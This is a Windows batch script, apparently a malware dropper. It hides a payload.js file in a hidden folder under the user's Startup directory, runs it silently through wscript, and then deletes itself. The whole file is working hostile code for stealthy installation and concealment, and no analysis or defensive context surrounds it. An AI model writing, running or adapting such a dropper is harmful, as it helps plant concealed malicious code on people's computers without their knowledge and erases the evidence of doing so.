@echo off
:: Create a hidden directory for the payload
mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.hidden" 2>nul

:: Copy payload to startup folder
copy "%~dp0payload.js" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.hidden\payload.js" 2>nul

:: Create a shortcut to run payload silently
set SCRIPT_PATH="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.hidden\payload.js"
set WSCRIPT="%SYSTEMROOT%\System32\wscript.exe"
%WSCRIPT% //nologo //e:jscript "%SCRIPT_PATH%"

:: Delete installer itself
del /f /q "%~f0"
exit